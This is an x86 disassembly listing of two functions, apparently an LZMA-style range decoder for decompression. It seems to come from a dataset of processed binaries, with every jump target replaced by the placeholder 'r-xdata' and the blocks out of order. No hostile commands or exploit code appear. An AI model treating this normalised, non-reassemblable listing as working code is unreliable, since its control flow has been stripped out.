cmp dl 0xe1
jae r-xdata
movzx eax dl
cdq
pop ecx
idiv ecx
push 0x5
pop ecx
movzx eax al
mov edi edx
cdq
idiv ecx
mov [ esi + 0x8 ] eax
lea ecx [ edx + edi ]
cmp ecx 0x4
jg r-xdata
mov [ esi ] edi
mov [ esi + 0x4 ] edx
mov [ esi + 0x88 ] ebx
push 0x6
jmp r-xdata
sub_406b7d
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x14 ]
push esi
and [ ebx ] 0x0
mov esi ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x14 ] edx
mov edx [ ecx ]
and [ ecx ] 0x0
cmp [ esi + 0x78 ] 0x8
push edi
mov [ ebp - 0x4 ] edx
je r-xdata
mov [ ebx ] 0x1
mov eax [ esi + 0x78 ]
mov edi [ esi + 0x24 ]
mov [ ebp - 0x10 ] edi
cmp eax 0x9
je r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp eax 0x6
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ebp - 0x14 ]
mov ecx [ ecx ]
and [ ebp - 0x8 ] 0x0
sub edx edi
mov edi [ ebp - 0x4 ]
sub edi ecx
mov [ ebp - 0xc ] ecx
mov ecx [ esi + 0x74 ]
mov [ ebp + 0x14 ] edx
cmp ecx edx
ja r-xdata
cmp eax 0x7
je r-xdata
mov cl [ esi + 0x7c ]
test cl cl
js r-xdata
mov [ ebp + 0x14 ] ecx
mov [ ebp - 0x8 ] 0x1
mov eax [ ecx ]
cmp eax edx
je r-xdata
cmp eax 0x6
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ ebp - 0xc ] edx
je r-xdata
mov [ ebx ] 0x3
jmp r-xdata
mov edi [ ebp + 0x8 ]
inc eax
mov dl [ edi ]
mov [ ecx ] eax
mov ecx esi
call sub_406a8c
mov ecx [ ebp + 0xc ]
inc edi
mov [ esi + 0x78 ] eax
mov [ ebp + 0x8 ] edi
jmp r-xdata
cmp edi [ esi + 0x70 ]
mov ecx [ ebp - 0x10 ]
cmova edi [ esi + 0x70 ]
mov edx [ ebp + 0x14 ]
push ebx
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] edi
mov edi [ ebp + 0x8 ]
push eax
lea edx [ edx + ecx ]
push edi
mov ecx esi
call sub_4080c3
mov edx [ ebp - 0xc ]
mov ecx [ ebp + 0xc ]
sub [ esi + 0x70 ] edx
add [ ecx ] edx
add edi edx
mov [ ebp + 0x8 ] edi
mov edi [ esi + 0x24 ]
sub edi [ ebp - 0x10 ]
add esp 0x10
sub [ esi + 0x74 ] edi
test eax eax
jne r-xdata
movzx eax cl
shr eax 0x5
and eax 0x3
xor edx edx
cmp eax 0x3
sete dl
xor ecx ecx
test eax eax
setg cl
test edx edx
jne r-xdata
cmp eax 0x6
jne r-xdata
xor eax eax
cmp [ esi + 0x78 ] 0x8
je r-xdata
cmp [ ebx ] 0x3
je r-xdata
test ecx ecx
jne r-xdata
cmp [ esi + 0x80 ] edx
jne r-xdata
cmp edi [ ebp + 0x14 ]
cmova edi [ ebp + 0x14 ]
test edi edi
je r-xdata
xor edx edx
cmp cl 0x1
sete dl
test edx edx
je r-xdata
mov edx [ ebp - 0x4 ]
jmp r-xdata
test edx edx
jne r-xdata
push ecx
mov ecx esi
call sub_408099
and [ esi + 0x80 ] 0x0
add esp 0x4
and [ esi + 0x84 ] 0x0
mov [ esi + 0x78 ] 0x7
cmp [ esi + 0x84 ] ecx
jne r-xdata
mov eax [ esi + 0x14 ]
add eax [ esi + 0x24 ]
push edi
push [ ebp + 0x8 ]
push eax
call sub_410100
add [ esi + 0x24 ] edi
add esp 0xc
cmp [ esi + 0x30 ] 0x0
jne r-xdata
cmp [ esi + 0x80 ] 0x0
jne r-xdata
xor eax eax
inc eax
mov [ esi + 0x84 ] eax
mov [ esi + 0x88 ] eax
jmp r-xdata
cmp [ ebx ] 0x4
jne r-xdata
test edi edi
jne r-xdata
add [ esi + 0x2c ] edi
sub [ esi + 0x74 ] edi
mov ecx [ ebp + 0xc ]
add [ ebp + 0x8 ] edi
add [ ecx ] edi
mov eax [ esi + 0x74 ]
neg eax
sbb eax eax
and eax 0x7
mov [ esi + 0x78 ] eax
jmp r-xdata
mov ecx [ esi + 0xc ]
mov eax ecx
sub eax [ esi + 0x2c ]
cmp eax edi
ja r-xdata
and [ esi + 0x80 ] 0x0
push 0x0
mov ecx esi
call sub_408099
add esp 0x4
mov [ ebx ] 0x2
cmp [ ebx ] 0x4
jne r-xdata
mov [ esi + 0x30 ] ecx
cmp [ esi + 0x74 ] edi
jne r-xdata
cmp [ esi + 0x70 ] edi
jne r-xdata
and [ esi + 0x78 ] edi
sub_406db9
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov [ ebp - 0x50 ] edx
mov eax ecx
mov [ ebp - 0x54 ] eax
mov ecx [ eax + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0x38 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x2c ] ecx
mov ecx [ eax + 0x40 ]
mov [ ebp - 0x30 ] ecx
mov ecx [ eax + 0x44 ]
xor ebx ebx
inc ebx
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x8 ]
shl ebx cl
mov ecx [ eax + 0x4 ]
mov esi [ eax + 0x20 ]
dec ebx
mov [ ebp - 0x58 ] ebx
xor ebx ebx
inc ebx
shl ebx cl
mov ecx [ eax ]
mov [ ebp - 0x44 ] ecx
mov ecx [ eax + 0x14 ]
dec ebx
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x34 ] ecx
mov ecx [ eax + 0x28 ]
mov [ ebp - 0x5c ] ebx
mov ebx [ eax + 0x30 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ eax + 0x24 ]
mov edx [ eax + 0x34 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x2c ]
mov [ ebp - 0x40 ] ebx
mov ebx [ eax + 0x18 ]
mov edi [ eax + 0x1c ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] ebx
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov [ ebp - 0x4 ] ebx
sub edi eax
sub esi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ ebp - 0xc ]
mov [ eax + edx * 2 ] cx
mov edx [ ebp - 0x10 ]
movzx ecx [ eax + edx * 2 + 0x180 ]
cmp edi 0x1000000
jae r-xdata
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
cmp [ ebp - 0x40 ] 0x0
mov ecx [ ebp - 0xc ]
lea ebx [ ecx + 0xe6c ]
mov [ ecx + edx * 2 ] ax
mov [ ebp - 0x20 ] ebx
jne r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x14 ]
test ecx ecx
mov eax ecx
cmove eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x34 ]
push 0x8
movzx edx [ eax + ecx - 0x1 ]
mov eax [ ebp - 0x18 ]
and eax [ ebp - 0x5c ]
pop ecx
sub cl [ ebp - 0x44 ]
shr edx cl
mov ecx [ ebp - 0x44 ]
shl eax cl
add edx eax
imul edx edx 0x600
add ebx edx
mov [ ebp - 0x20 ] ebx
cmp [ ebp - 0x18 ] 0x0
je r-xdata
sub edi eax
sub esi eax
mov eax ecx
shr eax 0x5
sub ecx eax
cmp [ ebp - 0x40 ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax + edx * 2 + 0x180 ] cx
jne r-xdata
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ ebp - 0xc ]
add edx 0xc
mov [ ecx + edx * 2 + 0x168 ] ax
add ecx 0x664
jmp r-xdata
mov ebx [ ebp - 0x14 ]
cmp ebx [ ebp - 0x24 ]
mov edx [ ebp - 0x54 ]
sbb eax eax
and eax [ ebp - 0x28 ]
sub eax [ ebp - 0x24 ]
add eax [ edx + 0x14 ]
cmp ecx 0xa
mov edx 0x100
movzx ebx [ eax + ebx ]
sbb eax eax
and eax 0xfffffffd
add eax 0x6
sub ecx eax
mov [ ebp - 0x10 ] ecx
xor ecx ecx
mov [ ebp - 0x8 ] edx
inc ecx
cmp ecx 0x4
push 0x3
pop eax
cmovb eax ecx
sub ecx eax
mov [ ebp - 0x10 ] ecx
xor ecx ecx
inc ecx
mov ecx [ ebp - 0x10 ]
cmp ecx 0x7
jae r-xdata
movzx edx [ eax + edx * 2 + 0x198 ]
cmp edi 0x1000000
jae r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] edx
movzx edx [ ecx ]
cmp edi 0x1000000
jae r-xdata
mov ebx [ ebp - 0x20 ]
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
mov eax [ ebp - 0x4 ]
shl esi 0x8
movzx eax [ eax ]
shl edi 0x8
or esi eax
inc [ ebp - 0x4 ]
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
mov eax [ ebp - 0x4 ]
shl esi 0x8
movzx eax [ eax ]
shl edi 0x8
or esi eax
inc [ ebp - 0x4 ]
mov ecx edi
shr ecx 0xb
imul ecx edx
cmp esi ecx
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov [ ebp - 0x4 ] ebx
xor eax eax
inc eax
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov [ ebp - 0x4 ] ebx
sub edi eax
sub esi eax
mov eax edx
shr eax 0x5
sub edx eax
mov eax [ ebp - 0x3c ]
lea ecx [ ecx * 2 + 0x1 ]
mov [ ebx + eax * 2 ] dx
mov edx [ ebp - 0x8 ]
and edx [ ebp - 0x48 ]
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov edx [ ebp - 0x3c ]
add ecx ecx
mov [ ebx + edx * 2 ] ax
mov ebx [ ebp - 0x48 ]
mov edx [ ebp - 0x8 ]
not ebx
and edx ebx
jmp r-xdata
sub edi eax
sub esi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ ecx + ebx ] dx
inc ecx
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov [ ecx + ebx ] ax
jmp r-xdata
mov eax edx
shr eax 0x5
sub edx eax
mov eax [ ebp - 0x10 ]
sub edi ecx
sub esi ecx
mov ecx [ ebp - 0xc ]
mov [ ecx + eax * 2 + 0x198 ] dx
mov edx eax
movzx ecx [ ecx + edx * 2 + 0x1b0 ]
cmp edi 0x1000000
jae r-xdata
mov ebx [ ebp - 0xc ]
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov edx [ ebp - 0x10 ]
mov edi ecx
mov [ ebx + edx * 2 + 0x198 ] ax
mov eax [ ebp - 0xc ]
lea ebx [ edx + 0xf ]
shl ebx 0x4
add ebx [ ebp - 0x20 ]
movzx edx [ eax + ebx * 2 ]
cmp ecx 0x1000000
jae r-xdata
sub edi eax
sub esi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ ecx ] dx
movzx edx [ ecx + 0x2 ]
cmp edi 0x1000000
jae r-xdata
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov edx [ ebp - 0x20 ]
shl edx 0x4
add edx 0x4
add edx ecx
mov [ ecx ] ax
xor ebx ebx
add ebx ebx
mov [ ebp - 0x4c ] ebx
mov ebx edx
and ebx [ ebp - 0x4c ]
mov [ ebp - 0x48 ] ebx
lea eax [ ebx + edx ]
mov edx [ ebp - 0x20 ]
add eax ecx
mov [ ebp - 0x3c ] eax
movzx edx [ edx + eax * 2 ]
cmp edi 0x1000000
jae r-xdata
mov ebx [ ebp - 0x14 ]
mov eax [ ebp - 0x34 ]
mov [ ebx + eax ] cl
mov ecx [ ebp - 0x18 ]
inc ebx
inc ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ebx [ ebp - 0x4c ]
mov [ ebp - 0x8 ] edx
cmp ecx 0x100
jb r-xdata
add ecx ecx
movzx edx [ ecx + ebx ]
cmp edi 0x1000000
jae r-xdata
jmp r-xdata
cmp ecx 0x100
jb r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov [ ebp - 0x4 ] ebx
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl esi 0x8
movzx eax [ ecx ]
shl edi 0x8
or esi eax
inc ecx
mov [ ebp - 0x4 ] ecx
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov [ ebp - 0x4 ] ebx
xor ecx ecx
mov [ ebp - 0x3c ] ebx
mov ebx [ ebp - 0x4 ]
mov [ ebp - 0x20 ] eax
inc ecx
mov edx [ ebp - 0x10 ]
sub edi eax
sub esi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ ebp - 0xc ]
mov [ eax + edx * 2 + 0x1b0 ] cx
movzx ecx [ eax + edx * 2 + 0x1c8 ]
cmp edi 0x1000000
jae r-xdata
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx + edx * 2 + 0x1b0 ] ax
mov eax [ ebp - 0x2c ]
jmp r-xdata
sub edi eax
sub esi eax
mov eax edx
shr eax 0x5
sub edx eax
mov eax [ ebp - 0xc ]
mov [ eax + ebx * 2 ] dx
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov [ ecx + ebx * 2 ] ax
mov ebx [ ebp - 0x14 ]
cmp ebx [ ebp - 0x24 ]
mov ecx [ ebp - 0x34 ]
sbb eax eax
and eax [ ebp - 0x28 ]
sub eax [ ebp - 0x24 ]
add eax ebx
mov al [ eax + ecx ]
mov [ ebx + ecx ] al
mov ecx [ ebp - 0x18 ]
inc ebx
inc ecx
cmp [ ebp - 0x10 ] 0x7
mov [ ebp - 0x14 ] ebx
sbb edx edx
and edx 0xfffffffe
add edx 0xb
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x10 ] edx
jmp r-xdata
sub edi eax
sub esi eax
mov eax edx
shr eax 0x5
sub edx eax
push 0x10
mov [ ecx + 0x2 ] dx
lea edx [ ecx + 0x204 ]
pop ebx
mov eax 0x100
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov edx [ ebp - 0x20 ]
shl edx 0x4
add edx 0x104
push 0x8
mov [ ecx + 0x2 ] ax
add edx ecx
pop ebx
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov ebx [ ebp - 0x1c ]
mov ebx [ ebp - 0x4 ]
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x2c ] ecx
cmp edx 0x7
sbb edx edx
and edx 0xfffffffd
add edx 0xb
lea ecx [ eax + 0xa68 ]
cmp ebx [ ebp - 0x50 ]
jae r-xdata
push 0x8
pop eax
jmp r-xdata
sub edi eax
sub esi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ ebp - 0x1c ]
mov [ eax + edx ] cx
mov ecx eax
inc ecx
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ ebp - 0x1c ]
mov [ ecx + edx ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
mov [ eax + 0x18 ] ecx
mov ecx [ ebp - 0x14 ]
mov [ eax + 0x24 ] ecx
mov ecx [ ebp - 0x18 ]
mov [ eax + 0x2c ] ecx
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x1c ] edi
mov [ eax + 0x20 ] esi
mov [ eax + 0x48 ] ebx
mov [ eax + 0x38 ] ecx
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x3c ] ecx
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x40 ] ecx
mov ecx [ ebp - 0x38 ]
mov [ eax + 0x44 ] ecx
mov [ eax + 0x34 ] edx
xor eax eax
jmp r-xdata
movzx eax [ ecx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ecx
and ecx [ ebp - 0x58 ]
mov eax [ ebp - 0xc ]
shl edx 0x4
add edx ecx
mov [ ebp - 0x20 ] ecx
movzx ecx [ eax + edx * 2 ]
cmp edi 0x1000000
jae r-xdata
sub edi eax
sub esi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ ebp - 0xc ]
mov [ eax + edx * 2 + 0x1c8 ] cx
mov ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x38 ] ecx
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx + edx * 2 + 0x1c8 ] ax
mov eax [ ebp - 0x30 ]
jmp r-xdata
add ecx ecx
mov [ ebp - 0x1c ] ecx
movzx ecx [ ecx + edx ]
cmp edi 0x1000000
jae r-xdata
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0x3c ]
sub ebx eax
add ecx ebx
cmp [ ebp - 0x10 ] 0xc
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x1c ] ecx
jb r-xdata
mov eax [ ebp - 0x20 ]
cmp ecx eax
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ecx
mov ebx [ ebp - 0x14 ]
mov eax [ ebp - 0x50 ]
add ecx 0x2
mov [ ebp - 0x1c ] ecx
cmp eax ebx
je r-xdata
cmp ecx 0x4
push 0x3
pop eax
cmovb eax ecx
mov ecx [ ebp - 0xc ]
shl eax 0x7
add ecx 0x360
add ecx eax
movzx edx [ ecx + 0x2 ]
cmp edi 0x1000000
jae r-xdata
sub eax ebx
cmp eax ecx
mov edx ecx
cmovb edx eax
cmp ebx [ ebp - 0x24 ]
sbb ecx ecx
and ecx [ ebp - 0x28 ]
add [ ebp - 0x18 ] edx
sub ecx [ ebp - 0x24 ]
sub [ ebp - 0x1c ] edx
add ecx ebx
lea eax [ ecx + edx ]
cmp eax [ ebp - 0x28 ]
ja r-xdata
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
mov ebx [ ebp - 0x4 ]
shl esi 0x8
movzx eax [ ebx ]
or esi eax
shl edi 0x8
inc ebx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x34 ]
mov edi [ ebp - 0x28 ]
add ebx [ ebp - 0x34 ]
sub ecx [ ebp - 0x14 ]
add [ ebp - 0x14 ] edx
lea eax [ ebx + edx ]
mov [ ebp - 0x4c ] eax
mov edx eax
sub esi eax
sub edi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ ebp - 0x8 ] esi
mov [ ecx + 0x2 ] dx
push 0x3
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov [ ecx + 0x2 ] ax
push 0x2
jmp r-xdata
mov al [ ecx + esi ]
mov [ ebx + esi ] al
inc ebx
inc ecx
xor eax eax
cmp ecx edi
cmove ecx eax
dec edx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x20 ]
mov [ ebp - 0x14 ] ebx
mov al [ ecx + ebx ]
mov [ ebx ] al
inc ebx
cmp ebx edx
jne r-xdata
mov ebx [ ebp - 0x14 ]
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
mov eax [ ebp - 0x4 ]
shl esi 0x8
movzx eax [ eax ]
or esi eax
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
pop ebx
add ebx ebx
movzx edx [ ebx + ecx ]
cmp edi 0x1000000
jae r-xdata
mov ecx [ ebp - 0x18 ]
sub esi eax
sub edi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ ebx + ecx ] dx
mov [ ebp - 0x8 ] esi
inc ebx
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov [ ebx + ecx ] ax
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
mov eax [ ebp - 0x4 ]
shl esi 0x8
movzx eax [ eax ]
or esi eax
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
add ebx ebx
movzx edx [ ebx + ecx ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ ebx + ecx ] dx
mov [ ebp - 0x8 ] esi
inc ebx
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov [ ebx + ecx ] ax
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
mov eax [ ebp - 0x4 ]
shl esi 0x8
movzx eax [ eax ]
or esi eax
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
add ebx ebx
movzx edx [ ebx + ecx ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ ebx + ecx ] dx
mov [ ebp - 0x8 ] esi
inc ebx
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov [ ebx + ecx ] ax
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
mov eax [ ebp - 0x4 ]
shl esi 0x8
movzx eax [ eax ]
or esi eax
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
add ebx ebx
movzx edx [ ebx + ecx ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax edx
shr eax 0x5
sub edx eax
mov [ ebx + ecx ] dx
mov [ ebp - 0x8 ] esi
inc ebx
mov edi eax
mov eax 0x800
sub eax edx
shr eax 0x5
add eax edx
mov [ ebx + ecx ] ax
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax ebx
cmp esi eax
jae r-xdata
mov eax [ ebp - 0x4 ]
shl esi 0x8
movzx eax [ eax ]
or esi eax
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
lea edx [ ebx + ebx ]
movzx ebx [ edx + ecx ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax ebx
shr eax 0x5
sub ebx eax
mov [ edx + ecx ] bx
mov [ ebp - 0x8 ] esi
inc edx
mov edi eax
mov eax 0x800
sub eax ebx
shr eax 0x5
add eax ebx
mov [ edx + ecx ] ax
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x38 ] ecx
mov ecx [ ebp - 0x2c ]
lea eax [ edx + 0x1 ]
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x2c ] ecx
test eax eax
jne r-xdata
mov ecx edx
mov ebx edx
shr ecx 0x1
and edx 0x1
dec ecx
or edx 0x2
mov [ ebp - 0x20 ] ecx
cmp ebx 0xe
jae r-xdata
sub edx 0x40
mov [ ebp - 0x20 ] edi
cmp edx 0x4
jb r-xdata
cmp edx eax
cmp edx [ ebp - 0x18 ]
jmp r-xdata
sub ecx 0x4
shl edx cl
mov eax edx
sub eax ebx
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + eax * 2 ]
add ebx 0x55e
xor eax eax
inc eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x38 ] eax
cmp [ ebp - 0x10 ] 0x13
mov ecx [ ebp - 0x1c ]
sbb eax eax
and eax 0xfffffffd
add eax 0xa
mov [ ebp - 0x10 ] eax
jae r-xdata
shr edi 0x1
sub esi edi
mov eax esi
shr eax 0x1f
neg eax
lea edx [ edx * 2 + 0x1 ]
add edx eax
and eax edi
add esi eax
dec ecx
jne r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x8 ]
mov eax edi
shr eax 0xb
imul eax ebx
cmp esi eax
jae r-xdata
mov eax [ ebp - 0x4 ]
shl esi 0x8
movzx eax [ eax ]
shl edi 0x8
or esi eax
inc [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
cmp edi 0x1000000
jae r-xdata
mov eax [ ebp - 0xc ]
shl edx 0x4
movzx ecx [ eax + 0x646 ]
mov [ ebp - 0x8 ] esi
cmp edi 0x1000000
jae r-xdata
sub edi eax
sub esi eax
mov eax ebx
shr eax 0x5
sub ebx eax
mov eax [ ebp - 0x3c ]
mov [ eax + ecx ] bx
mov ebx [ ebp - 0x38 ]
inc eax
or edx ebx
mov edi eax
mov eax 0x800
sub eax ebx
shr eax 0x5
add eax ebx
mov ebx [ ebp - 0x3c ]
mov [ ebx + ecx ] ax
mov eax ebx
mov ebx [ ebp - 0x38 ]
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
or esi eax
shl edi 0x8
inc ebx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
add eax eax
mov [ ebp - 0x3c ] eax
movzx ebx [ eax + ebx ]
cmp edi 0x1000000
jae r-xdata
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ebx ebx
dec ecx
mov [ ebp - 0x38 ] ebx
mov ebx [ ebp - 0x8 ]
mov [ ebp - 0x20 ] ecx
jne r-xdata
sub esi eax
sub edi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] esi
mov [ eax + 0x646 ] cx
push 0x3
or edx 0x1
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ ebp - 0xc ]
push 0x2
mov [ ecx + 0x646 ] ax
mov eax ecx
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
mov eax [ ebp - 0x4 ]
shl esi 0x8
movzx eax [ eax ]
or esi eax
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
pop ebx
add ebx ebx
movzx ecx [ ebx + eax + 0x644 ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ ebp - 0xc ]
inc ebx
mov [ ebx + eax + 0x643 ] cx
mov [ ebp - 0x8 ] esi
or edx 0x2
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ ebx + ecx + 0x644 ] ax
mov eax ecx
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
mov eax [ ebp - 0x4 ]
shl esi 0x8
movzx eax [ eax ]
or esi eax
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
add ebx ebx
movzx ecx [ ebx + eax + 0x644 ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ ebp - 0xc ]
inc ebx
mov [ ebx + eax + 0x643 ] cx
mov [ ebp - 0x8 ] esi
or edx 0x4
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ ebx + ecx + 0x644 ] ax
mov eax ecx
jmp r-xdata
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
mov eax [ ebp - 0x4 ]
shl esi 0x8
movzx eax [ eax ]
or esi eax
shl edi 0x8
inc [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
movzx ecx [ eax + ebx * 2 + 0x644 ]
cmp edi 0x1000000
jae r-xdata
sub esi eax
sub edi eax
mov eax ecx
shr eax 0x5
sub ecx eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] esi
mov [ eax + ebx * 2 + 0x644 ] cx
or edx 0x8
mov edi eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx + ebx * 2 + 0x644 ] ax
jmp r-xdata
mov ebx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
add ebx 0x112
sub edx 0xc
jmp r-xdata
mov [ ebp - 0x20 ] edi
cmp edx 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
